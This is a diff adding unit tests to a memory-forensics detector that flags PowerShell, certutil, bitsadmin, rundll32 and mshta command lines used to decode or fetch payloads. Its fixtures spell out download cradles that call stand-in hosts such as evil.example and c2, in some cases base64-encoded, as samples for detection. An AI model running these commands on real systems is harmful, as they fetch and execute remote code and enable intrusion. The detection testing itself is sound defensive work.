@@ -7,6 +7,8 @@ Vol3 version is installed.
 
 from __future__ import annotations
 
+import base64
+
 from sift_find_evil.detectors.memory_detector import MemoryDetector
 from sift_find_evil.findings import FindingCategory
 from sift_find_evil.memory.volatility_runner import (
@@ -15,6 +17,11 @@ from sift_find_evil.memory.volatility_runner import (
     NetworkRow,
     ProcessRow,
 )
+
+
+def _ps_encode(cmd: str) -> str:
+    """Mimic `powershell -EncodedCommand`: UTF-16LE + base64."""
+    return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
 
 
 # -- fixture helpers -------------------------------------------------------
@@ -221,6 +228,200 @@ def test_cmdline_null_args_skipped() -> None:
     row = CommandLineRow(pid=4, process="System", args=None, raw_row={})
     findings = MemoryDetector().analyze(cmdline=[row])
     assert findings == []
+
+
+# -- cmdline T1140 (Deobfuscate/Decode) -----------------------------------
+
+
+def test_cmdline_encoded_command_decodes_and_fires_high() -> None:
+    """`-EncodedCommand <utf16le-base64>` is the canonical T1140 shape
+    for PowerShell. We must decode it and surface the decoded payload."""
+    payload = 'IEX(New-Object Net.WebClient).DownloadString("http://evil.example/a.ps1")'
+    encoded = _ps_encode(payload)
+    row = _cmdline_row(
+        1234,
+        "powershell.exe",
+        f"powershell -nop -w hidden -EncodedCommand {encoded}",
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    # One LOLBAS+hidden cmdline finding AND one T1140 deobfuscation finding.
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+    f = t1140[0]
+    assert f.category == FindingCategory.PROCESS_INJECTION
+    assert f.severity == "high"
+    assert f.confidence >= 0.80
+    assert "DownloadString" in f.evidence["decoded_payload"]
+    assert "http://evil.example/a.ps1" in f.evidence["decoded_payload"]
+    assert "T1027" in f.evidence["mitre_attack"]
+    # T1059 or its PowerShell sub-technique T1059.001 — either is valid.
+    assert any(t.startswith("T1059") for t in f.evidence["mitre_attack"])
+
+
+def test_cmdline_short_enc_flag_also_decodes() -> None:
+    """PowerShell accepts `-enc` as the short form of `-EncodedCommand`."""
+    payload = "FromBase64String('AAAA'); IEX $x"
+    encoded = _ps_encode(payload)
+    row = _cmdline_row(
+        1234,
+        "powershell.exe",
+        f"powershell -enc {encoded}",
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+    assert "FromBase64String" in t1140[0].evidence["decoded_payload"]
+
+
+def test_cmdline_invalid_base64_after_enc_does_not_crash() -> None:
+    """Malformed payload after -enc must fall back to the legacy cmdline
+    finding without crashing or adding a bogus T1140 finding."""
+    row = _cmdline_row(
+        1234,
+        "powershell.exe",
+        "powershell -EncodedCommand !!!not-valid-base64!!!",
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    # Still get the legacy LOLBAS + hidden-flag finding.
+    assert len(findings) >= 1
+    # But no T1140 finding, since we couldn't decode anything.
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert t1140 == []
+
+
+def test_cmdline_certutil_decode_fires_without_enc() -> None:
+    """`certutil -decode` is a LOLBAS deobfuscation primitive and should
+    fire T1140 regardless of -enc presence. Severity stays medium when
+    unaccompanied by a decoded stage-one marker, because certutil has
+    legitimate (rare but real) admin use."""
+    row = _cmdline_row(
+        1234,
+        "certutil.exe",
+        "certutil -decode C:\\Users\\Public\\payload.b64 C:\\Users\\Public\\payload.exe",
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+    assert t1140[0].severity == "medium"
+    reasons = " ".join(t1140[0].evidence.get("reasons", []))
+    assert "certutil" in reasons.lower()
+
+
+def test_cmdline_bitsadmin_transfer_stays_medium() -> None:
+    """bitsadmin /transfer is commonly abused but also legitimately used
+    for patching. Without other signals, stay medium."""
+    row = _cmdline_row(
+        1234,
+        "bitsadmin.exe",
+        "bitsadmin /transfer myJob http://evil/a.exe C:\\Temp\\a.exe",
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+    assert t1140[0].severity == "medium"
+
+
+def test_cmdline_rundll32_javascript_fires() -> None:
+    """`rundll32 javascript:...` is the canonical squiblydoo/squiblytwo
+    pattern — classic T1218/T1140 combo. No legitimate use -> high."""
+    row = _cmdline_row(
+        1234,
+        "rundll32.exe",
+        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1);',
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+    assert t1140[0].severity == "high"
+
+
+def test_cmdline_iex_downloadstring_plaintext_fires_high() -> None:
+    """Stage-one loader: `IEX (New-Object Net.WebClient).DownloadString(url)`
+    is the single most common PowerShell download-cradle and should
+    surface high severity even without any encoding."""
+    row = _cmdline_row(
+        1234,
+        "powershell.exe",
+        'powershell IEX(New-Object Net.WebClient).DownloadString("http://evil/a")',
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+    assert t1140[0].severity == "high"
+
+
+def test_cmdline_high_entropy_decoded_payload_bumps_severity() -> None:
+    """A decoded payload with Shannon entropy > threshold AND second-stage
+    markers (IEX + DownloadString + url) should be high severity."""
+    # Craft something that decodes to shellcode-adjacent markers.
+    payload = (
+        "$b=[Convert]::FromBase64String('AAAA'); "
+        '[Reflection.Assembly]::Load($b); IEX((New-Object Net.WebClient).DownloadString("http://c2/x"))'
+    )
+    encoded = _ps_encode(payload)
+    row = _cmdline_row(
+        1234,
+        "powershell.exe",
+        f"powershell -nop -enc {encoded}",
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+    assert t1140[0].severity == "high"
+    reasons = " ".join(t1140[0].evidence.get("reasons", []))
+    assert "Reflection.Assembly" in reasons or "reflection" in reasons.lower()
+
+
+def test_cmdline_decoded_payload_truncated() -> None:
+    """Huge decoded payloads must be truncated in evidence to avoid
+    memory blowups during JSON serialization."""
+    huge = "X" * 100_000
+    encoded = _ps_encode(huge)
+    row = _cmdline_row(
+        1234,
+        "powershell.exe",
+        f"powershell -enc {encoded}",
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+    # Decoded payload stored in evidence is truncated to _MAX_COMMAND_LENGTH.
+    assert len(t1140[0].evidence["decoded_payload"]) <= 8192
+
+
+def test_cmdline_plain_benign_powershell_does_not_fire_t1140() -> None:
+    """A benign `Get-Process` call must not get a T1140 tag just because
+    powershell is LOLBAS. T1140 requires a decoding/deobfuscation signal."""
+    row = _cmdline_row(1234, "powershell.exe", "powershell Get-Process")
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert t1140 == []
+
+
+def test_cmdline_mshta_vbscript_fires() -> None:
+    """`mshta vbscript:...` is a classic script-host abuse vector that
+    T1140 detection should catch."""
+    row = _cmdline_row(
+        1234,
+        "mshta.exe",
+        'mshta vbscript:CreateObject("Wscript.Shell").Run("cmd /c calc")',
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
+
+
+def test_cmdline_bitsadmin_transfer_fires() -> None:
+    """`bitsadmin /transfer` is a download-cradle alternative that should
+    land under T1140/T1105."""
+    row = _cmdline_row(
+        1234,
+        "bitsadmin.exe",
+        "bitsadmin /transfer myJob http://evil/a.exe C:\\Temp\\a.exe",
+    )
+    findings = MemoryDetector().analyze(cmdline=[row])
+    t1140 = [f for f in findings if "T1140" in f.evidence.get("mitre_attack", [])]
+    assert len(t1140) == 1
 
 
 # -- netscan (suspicious sockets) -----------------------------------------
